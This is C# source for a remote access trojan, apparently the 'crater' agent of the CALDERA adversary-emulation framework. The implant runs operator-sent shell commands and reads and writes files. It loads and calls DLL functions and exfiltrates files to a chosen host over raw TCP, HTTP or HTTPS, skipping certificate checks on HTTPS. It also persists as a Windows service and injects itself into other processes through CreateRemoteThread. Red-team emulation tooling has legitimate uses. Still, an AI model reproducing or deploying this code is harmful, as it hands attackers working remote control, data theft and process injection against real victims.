using System;
using System.Collections.Generic;
using System.ServiceProcess;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;
using CalderaIO;
using static WinAPI.Kernel32;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Collections.Specialized;
//using RGiesecke.DllExport;

namespace crater
{
    class AsyncProcessStream
    {
        public Process process;
        private string output = String.Empty;

        public AsyncProcessStream(string commandLine)
        {
            string fileName;
            string arguments;
            if (commandLine.StartsWith("\""))
            {
                fileName = commandLine.Split('"')[0];
                arguments = commandLine.Substring(Math.Min(fileName.Length + 3, commandLine.Length)); // "file_name" args...
            } else
            {
                fileName = commandLine.Split(' ')[0];
                arguments = commandLine.Substring(Math.Min(fileName.Length + 1, commandLine.Length)); // file_name args...
            }

            try
            {
                int width = Math.Max(Console.WindowLeft + Console.WindowWidth, 1000);
                int height = Math.Max(Console.WindowTop + Console.WindowHeight, 100);
                Console.SetBufferSize(width, height);
            } catch (System.IO.IOException)
            {
                Debug.WriteLine(String.Format("Warning: SetBufferSize() errored out"));
            }

            process = new Process();
            // p.StartInfo = new ProcessStartInfo();
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.FileName = fileName;
            
        }

        public void Start()
        {
            process.OutputDataReceived += OutputHandler;
            process.ErrorDataReceived += OutputHandler;
            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
        }

        public void Write(string stdIn)
        {
            Debug.WriteLine(String.Format("Writing to stdin {0}", stdIn));
            process.StandardInput.Write(stdIn);
        }

        public string Interact(string stdIn)
        {
            int offset = output.Length;
            Thread.Sleep(100);
            Write(stdIn);
            Thread.Sleep(100);
            return output.Substring(offset);
        }

        public void WaitForExit()
        {
            process.WaitForExit();
        }

        public string GetOutput()
        {
            return output;
        }

        public void OutputHandler(object sender, System.Diagnostics.DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                Debug.WriteLine(String.Format("output >> {0}", e.Data));
                output += e.Data + "\r\n";
            }
        }

    }

    class RAT : CalderaIO.IOClient
    {

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr WideStringFunction([MarshalAs(UnmanagedType.LPWStr)] string input);

        AsyncProcessStream shell = null;

        public override RatMessage DispatchMessage(RatMessage message)
        {
            RatMessage returnMessage = new RatMessage() {
                opcode = message.opcode,
                response = true,
                id = message.id,
                parameters = null // this will be defined by the function
            };

            // TODO: Add some sort of routing
            // RatMessage.Opcode.Exit would have already broken out of the loop
            switch (message.opcode)
            {
                case Opcodes.ExecuteCommand:
                    string use_shell = null;
                    string stdIn = null;

                    message.parameters.TryGetValue("use_shell", out use_shell);
                    message.parameters.TryGetValue("stdin", out stdIn);
                    if (use_shell == "true" || use_shell == "yes")
                    {
                        returnMessage.parameters = InteractShell(message.parameters["command_line"] + "\r\n" + stdIn);
                    } else
                    {
                        returnMessage.parameters = RunCommandLine(message.parameters["command_line"], stdIn);
                    }
                    break;

                case Opcodes.WriteFile:
                    returnMessage.parameters = WriteFile(message.parameters["file_path"], message.parameters["contents"]);
                    break;

                case Opcodes.ReadFile:
                    returnMessage.parameters = ReadFile(message.parameters["file_path"]);
                    break;

                case Opcodes.OpenShell:
                    returnMessage.parameters = OpenShell();
                    break;

                case Opcodes.ReflectiveDllFunction:
                    // TODO: Actually make this reflective
                    string filename = String.Format("caldera_{0}-{1}.dll", GetCurrentProcessId(), message.id);
                    WriteFile(filename, message.parameters["binary"]);
                    returnMessage.parameters = RunDllFunction(filename, message.parameters["dll_function"], message.parameters["input"]);
                    File.Delete(filename);
                    // TODO!
                    break;

                case Opcodes.DllFunction:
                    returnMessage.parameters = RunDllFunction(message.parameters["file_path"], message.parameters["dll_function"], message.parameters["input"]);
                    break;

                case Opcodes.ExfilConnection:
                    string address = message.parameters["address"];
                    int port = Convert.ToInt32(message.parameters["port"]);
                    switch (message.parameters["method"])
                    {
                        case "rawtcp":
                            returnMessage.parameters = ExfilConnectionRawTCP(address, port, message.parameters["file_path"]);
                            break;
                        case "http":
                            returnMessage.parameters = ExfilConnectionHTTP(address, port, message.parameters["file_path"]);
                            break;
                        case "https":
                            returnMessage.parameters = ExfilConnectionHTTPS(address, port, message.parameters["file_path"]);
                            break;
                        default:
                            break;
                    }
                    
                    break;

                default:
                    break;
            }

            return returnMessage;
        }

        public Dictionary<string, string> ExfilConnectionRawTCP(string address, int port, string file_path)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            try
            {
                TcpClient clientSocket = new TcpClient(address, port);
                NetworkStream toServerStream = clientSocket.GetStream();
                byte[] outStream = Encoding.ASCII.GetBytes(Convert.ToBase64String(File.ReadAllBytes(file_path)));
                toServerStream.Write(outStream, 0, outStream.Length);
                toServerStream.Flush();
                clientSocket.Close();
                output["stdout"] = "Exfilled " + file_path + " contents to " + address + ":" + port.ToString() + "via raw TCP socket";
            }
            catch (System.IO.IOException)
            {
                output["stdout"] = "Failed to exfil because the file is being used by another process";
            }
            catch (System.Net.Sockets.SocketException)
            {
                output["stdout"] = "Failed to exfil because the target, " + address + ":" + port.ToString() + " actively refused the connection";
            }
            catch (Exception e)
            {
                //this is to catch all other errors and give us more data about it without actually crashing the entire rat
                output["stdout"] = "Failed to exfil: " + e.ToString();
            }
            return output;
        }

        public Dictionary<string, string> ExfilConnectionHTTP(string address, int port, string file_path)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            string URL = "";
            string uri = "/http_exfil_uri?";
            string parameter = "sessID=";
            if (port != 80)
            {
                URL = "http://" + address + ":" + port.ToString();
            }
            else
            {
                URL = "http://" + address;
            }
            try
            {
                string contents = Convert.ToBase64String(File.ReadAllBytes(file_path));
                if (contents.Length > 2000)
                {
                    //HTTP POST
                    //Microsoft maximum length of a URL in IE is 2,083 characters, so if we go over that, make a POST instead of a GET
                    var client = new WebClient();
                    var data = new NameValueCollection();
                    data["exfil"] = contents;
                    URL += "/exfil.aspx";
                    byte[] response = client.UploadValues(URL, "POST", data);
                    output["stdout"] = "Exfilled \"" + file_path + "\" contents to " + URL + " via POST data";
                    //output["stdout"] += System.Text.Encoding.UTF8.GetString(response);
                }
                else
                {
                    //HTTP GET
                    URL += uri + parameter + contents;
                    //create the web request
                    WebRequest webGetURL = WebRequest.Create(URL);
                    //send the request and get a streamreader for the response coming back
                    StreamReader responseStream = new StreamReader(webGetURL.GetResponse().GetResponseStream());
                    //read the actual response from the stream
                    string response = responseStream.ReadToEnd();
                    output["stdout"] = response;
                }  
            }
            catch (System.IO.IOException)
            {
                output["stdout"] = "Failed to exfil because the file is being used by another process";
            }
            catch (System.Net.Sockets.SocketException)
            {
                output["stdout"] = "Failed to exfil because the target, " + address + ":" + port.ToString() + " actively refused the connection";
            }
            catch (System.Net.WebException e)
            {
                if ( e.ToString().Contains("(404) Not Found"))
                {
                    //This isn't an exception, it's expected behavior because we're making a GET to something that doesn't exist
                    output["stdout"] = "Exfilled \"" + file_path + "\" contents to " + URL + " via parameter in GET URI";
                }
                else if (e.ToString().Contains("501"))
                {
                    //the receiving server doesn't support POST, so no data went through
                    output["stdout"] = "Failed to Exfil data.\nData too big for HTTP GET and " + address + ":" + port.ToString() + " does not support POST";
                }
                else
                {
                    output["stdout"] = "WebException, Failed to exfil: " + e.ToString();
                }
            }
            catch (Exception e)
            {
                //this is to catch all other errors and give us more data about it without actually crashing the entire rat
                output["stdout"] = "Failed to exfil: " + e.ToString();
            }
            return output;
        }

        public bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
        public Dictionary<string, string> ExfilConnectionHTTPS(string address, int port, string file_path)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            string URL = "";
            string uri = "/https_exfil_uri?";
            string parameter = "sessID=";
            if (port != 443)
            {
                URL = "https://" + address + ":" + port.ToString();
            }
            else
            {
                URL = "https://" + address;
            }
            try
            {
                string contents = Convert.ToBase64String(File.ReadAllBytes(file_path));
                //hande the case where there are invalid ssl certs installed
                ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);
                if (contents.Length > 2000)
                {
                    //HTTP POST
                    //Microsoft maximum length of a URL in IE is 2,083 characters, so if we go over that, make a POST instead of a GET
                    var client = new WebClient();
                    var data = new NameValueCollection();
                    data["exfil"] = contents;
                    URL += "/exfil.aspx";
                    byte[] response = client.UploadValues(URL, "POST", data);
                    output["stdout"] = "Exfilled \"" + file_path + "\" contents to " + URL + " via POST data";
                    
                }
                else
                {
                    //HTTP GET 
                    URL += uri + parameter + contents;
                    //create the web request
                    WebRequest webGetURL = WebRequest.Create(URL);
                    //send the request and get a streamreader for the response coming back
                    StreamReader responseStream = new StreamReader(webGetURL.GetResponse().GetResponseStream());
                    //read the actual response from the stream
                    string response = responseStream.ReadToEnd();
                    output["stdout"] = response;
                }
                
            }
            catch (System.IO.IOException)
            {
                output["stdout"] = "Failed to exfil because the file is being used by another process";
            }
            catch (System.Net.Sockets.SocketException)
            {
                output["stdout"] = "Failed to exfil because the target, " + address + ":" + port.ToString() + " actively refused the connection";
            }
            catch (System.Net.WebException e)
            {
                if (e.ToString().Contains("(404) Not Found"))
                {
                    //This isn't an exception, it's expected behavior because we're making a GET to something that doesn't exist
                    output["stdout"] = "Exfilled \"" + file_path + "\" contents to " + URL;
                }
                else if (e.ToString().Contains("501"))
                {
                    //the receiving server doesn't support POST, so no data went through
                    output["stdout"] = "Failed to Exfil data.\nData too big for HTTP GET and " + address + ":" + port.ToString() + " does not support POST";
                }
                else
                {
                    output["stdout"] = "WebException, Failed to exfil: " + e.ToString();
                }
            }
            catch (Exception e)
            {
                //this is to catch all other errors and give us more data about it without actually crashing the entire rat
                output["stdout"] = "Failed to exfil: " + e.ToString();
            }
            return output;
        }

        public Dictionary<string, string> InteractShell(string stdIn)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            if (shell == null )
            {
                OpenShell();
            }
            output["stdout"] = shell.Interact(stdIn);
            output["ppid"] = shell.process.Id.ToString();
            return output;
        }

        public Dictionary<string, string> OpenShell()
        {
            if (shell == null)
            {
                shell = new AsyncProcessStream("cmd");
                shell.Start();
                Thread.Sleep(50);
            }
            Dictionary<string, string> output = new Dictionary<string, string>();
            output["pid"] = shell.process.Id.ToString();
            return output;
        }

        public Dictionary<string, string> RunDllFunction(string dllName, string functionName, string inputArguments)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            SafeHandle hDll = LoadLibrary(dllName);
            if (!hDll.IsInvalid)
            {
                IntPtr lpFunction = GetProcAddress(hDll, functionName);
                if (lpFunction != IntPtr.Zero)
                {
                    WideStringFunction dllFunction = (WideStringFunction)Marshal.GetDelegateForFunctionPointer(lpFunction, typeof(WideStringFunction));
                    IntPtr retVal = dllFunction(inputArguments);
                    if (retVal != IntPtr.Zero)
                    {
                        output["stdout"] = Marshal.PtrToStringUni(retVal);
                    }
                }
                hDll.Close();
            }
            return output;
        }

        public Dictionary<string, string> RunCommandLine(string commandLine, string stdIn)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            AsyncProcessStream processStream = new AsyncProcessStream(commandLine);
            try
            {
                processStream.Start();
                output["pid"] = processStream.process.Id.ToString();

                if (stdIn != null)
                {
                    processStream.Write(stdIn);
                    processStream.Write("\r\n");
                    // write everything and then close the input
                    processStream.process.StandardInput.Close();
                }
                processStream.WaitForExit();
                output["stdout"] = processStream.GetOutput();
            }
            catch (System.InvalidOperationException e)
            {
                //TODO: e.ToString();
            }
            catch (System.ComponentModel.Win32Exception e)
            {
               //TODO: e.ToString(); into dictionary
            }
            return output;
        }
        
        public Dictionary<string, string> WriteFile(string fileName, string b64Contents)
        {
            File.WriteAllBytes(fileName, Convert.FromBase64String(b64Contents.Trim()));
            return new Dictionary<string, string>();
        }

        public Dictionary<string, string> ReadFile(string fileName)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            output["contents"] = Convert.ToBase64String(File.ReadAllBytes(fileName));
            return output;
        }

        public Dictionary<string, string> WriteRegistry(string keyName, string valueName, object value, RegistryValueKind valueKind)
        {
            Dictionary<string, string> output = new Dictionary<string, string>();
            Registry.SetValue(keyName, valueName, value, valueKind);
            return output;
        }
    }
    
    class CraterMain
    {
        public static string AssemblyPath
        {
            get
            {
                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                UriBuilder uri = new UriBuilder(codeBase);
                return Uri.UnescapeDataString(uri.Path);
            }
        }

        static void Main(string[] args)
        {
            Debug.WriteLine("Entered Main");
            ServiceBase[] ServicesToRun;

            ServicesToRun = new ServiceBase[]
            {
                new CraterService()
            };
#if DEBUG
            new Thread(new ThreadStart(CraterMain.StartClient)).Start();
#else
            bool resp = Console.OpenStandardInput(1) != Stream.Null;
            if (resp == true)
            {
                //run as a normal application
                new Thread(new ThreadStart(CraterMain.StartClient)).Start();
            }
            else
            {
                //run as a service
                Debug.WriteLine("About to kick off the service to run");
                ServiceBase.Run(ServicesToRun);
            }
#endif
        }

        public static void StartClient()
        {
            // Debug.WriteLine("Entered StartClient");
            // IOServer.StartServerAsync();

            RAT calderaRat = new crater.RAT();
            Debug.WriteLine("Started...");
            calderaRat.RunForever();
            // RatMessage message = new RatMessage() { opcode = RatMessage.Opcode.ExecuteCommand, id = 1, parameters = new Dictionary<string, string>(), response = false };
            // message.parameters["use_shell"] = "true";
            //message.parameters["command_line"] = "whoami";
            // calderaRat.DispatchMessage(message);

            /*
            RatMessage message2 = new RatMessage() { opcode = RatMessage.Opcode.ExecuteCommand, id = 1, parameters = new Dictionary<string, string>(), request = true };
            message2.parameters["use_shell"] = "true";
            message2.parameters["stdin"] = "exit";
            calderaRat.DispatchMessage(message2);
            */

            Debug.WriteLine("Exiting client...");
            // RAT.RunCommandLine("whoami");
            // calderaRat.WriteFile("C:\\users\\rwolf\\desktop\\test.tmp", Encoding.ASCII.GetBytes("This is a test!"));
        }
        
        public static void Inject(string inputPid)
        {
            // if injecting reflectively need to potentially bootstrap the .NET run time and then figure out reflective injection
            // https://web.archive.org/web/20101224064236/http://codingthewheel.com/archives/how-to-inject-a-managed-assembly-dll

            int pid = Convert.ToInt32(inputPid);
            Process p = Process.GetProcessById(pid);
            SafeHandle processHandle = OpenProcess(0x1FFFFF /* PROCESS_ALL_ACCESS */, false, pid);
            string dllName = AssemblyPath;

            if (processHandle.IsInvalid)
            {
                Debug.WriteLine(String.Format("OpenProcess failed with error {0}", Marshal.GetLastWin32Error()));
                return;
            }

            IntPtr lpBaseAddress = VirtualAllocEx(processHandle, IntPtr.Zero, new IntPtr((dllName.Length + 1) * 2), MEM_COMMIT, 0x04);
            if (lpBaseAddress == IntPtr.Zero)
            {
                Debug.WriteLine(String.Format("VirtualAllocEx failed with error {0}", Marshal.GetLastWin32Error()));
                processHandle.Close();
                return;

            }

            IntPtr _LoadLibrary = GetProcAddress(GetModuleHandleW("kernel32"), "LoadLibraryW");
            IntPtr numBytes;
            if (! WriteProcessMemory(processHandle, lpBaseAddress, System.Text.Encoding.Unicode.GetBytes(dllName), new IntPtr(dllName.Length * 2), out numBytes))
            {

                Debug.WriteLine(String.Format("WriteProcessMemory failed with error {0}", Marshal.GetLastWin32Error()));
                processHandle.Close();
                return;
            }

            Int32 dwThreadId;
            if (CreateRemoteThread(processHandle, IntPtr.Zero, IntPtr.Zero, _LoadLibrary, lpBaseAddress, 0, out dwThreadId) == IntPtr.Zero)
            {
                Debug.WriteLine(String.Format("CreateRemoteThread failed with error {0}", Marshal.GetLastWin32Error()));
                processHandle.Close();
                return;
            }

            Debug.WriteLine("Successfully injected into process!");
            
        }

        // Change the target type to Class library to run as a DLL with this entry point
        // it also needs to have a defined CPU type (x86/x64)
        //[DllExport("caldera")]       
        public static void StartCaldera()
        {
            Debug.WriteLine("Entered DLL Entry point");
            //new Thread(new ThreadStart(CraterMain.StartClient)).Start();
            StartClient();
        }
    }

    public partial class CraterService : ServiceBase
    {
        Thread craterThread;
        public CraterService()
        {
            Debug.WriteLine("Instantiated the service");        
        }

        protected override void OnStart(string[] args)
        {
            Debug.WriteLine("Service just started");
            craterThread = new Thread(new ThreadStart(CraterMain.StartClient));
            craterThread.Start();
            base.OnStart(args);
        }

        protected override void OnStop()
        {
            Debug.WriteLine("Service's OnStop method was called");
            craterThread.Abort();
            base.Stop();
            System.Environment.Exit(1);
        }
    }
}

